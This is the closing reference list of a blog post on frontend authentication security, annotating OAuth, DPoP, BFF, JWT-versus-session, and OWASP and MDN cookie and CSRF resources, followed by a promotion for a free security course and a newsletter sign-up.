+OAuth 2.0 for Browser-Based Applications
+ - IETF draft ranking BFF, token-mediating backend, and browser-only patterns in decreasing order of security
+
+RFC 9700: Best Current Practice for OAuth 2.0 Security
+ - the January 2025 security BCP, including refresh-token rotation and PKCE requirements
+
+RFC 6749: The OAuth 2.0 Authorization Framework
+ - the original spec, and where the public vs confidential client split is defined
+
+The Backend for Frontend Pattern
+ - Auth0, on the BFF as a confidential client and the cookie caveats
+
+BFF Security Framework
+ - Duende, on why in-browser token storage is no longer recommended and the custom-header CSRF trick
+
+The Token Handler Pattern
+ - Curity, on first-party cookies and same-site BFF hosting
+
+Refresh Token Rotation
+ - Auth0 docs on rotation and automatic reuse detection
+
+RFC 9449: OAuth 2.0 Demonstrating Proof of Possession (DPoP)
+ - sender-constrained tokens bound to a non-extractable browser key, for the no-server case
+
+Device Bound Session Credentials
+ - Chrome’s DBSC integration guide, the defense against pass-the-cookie
+
+Please Don’t Use JSON Web Tokens for Browser Sessions
+ - Ian London, on revocation and the stateless myth
+
+Stop using JWTs
+ - samsch, the long-running case for sessions over JWTs
+
+Cross-Site Request Forgery Prevention Cheat Sheet
+ - OWASP, on why the token is primary, and SameSite is defense in depth
+
+Session Management Cheat Sheet
+ - OWASP, on session ID handling, cookie prefixes, and fixation
+
+Testing for Cookie Attributes
+ - OWASP WSTG, on the 
+__Host-
+ prefix as the most secure cookie configuration
+
+MDN: Using HTTP cookies
+ - the HttpOnly, Secure, and SameSite attributes
+
+MDN: Sec-Fetch-Site
+ - the fetch-metadata header servers can check for CSRF defense
+
+MDN: Content Security Policy
+ - the nonce-based script allowlist that reduces how often XSS runs at all
+
+MDN: BroadcastChannel
+ - the same-origin cross-tab messaging API used to coordinate refresh
+
+⚡ FREE FOREVER · SIGN UP & START TODAY
+
+🛡️ FRONTEND SECURITY · REACT · VUE · ANGULAR · VANILLA JS
+ 
+Master Security in Frontend Applications
+
+Free, comprehensive frontend security course.
+
+XSS, CSRF, AI security, broken access control & the vulnerabilities that actually get you breached.
+
+100% FREE
+ 
+7 MODULES · ALL LIVE
+
+Start learning free →
+
+All 7 modules live now. No credit card.
+
+javascript
+react
+auth
+owasp
+xss
+csrf
+
+Share:
+
+Discover more from The Neciu Dan Newsletter
+ 
+A weekly column on Tech & Education, startup building and occasional hot takes.
+ 
+Over 1,000 subscribers
